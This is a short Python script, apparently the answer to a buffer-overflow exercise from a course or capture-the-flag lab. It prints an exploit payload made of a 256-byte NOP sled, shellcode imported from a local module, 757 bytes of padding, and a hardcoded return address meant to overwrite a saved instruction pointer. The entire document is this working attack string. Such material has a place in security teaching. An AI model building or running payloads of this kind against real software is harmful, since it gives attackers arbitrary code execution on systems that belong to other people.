#!/usr/bin/python

from shellcode import shellcode
print ("\x90"*256+shellcode+"A"*757+"\xf0\xb1\xfe\xbf")
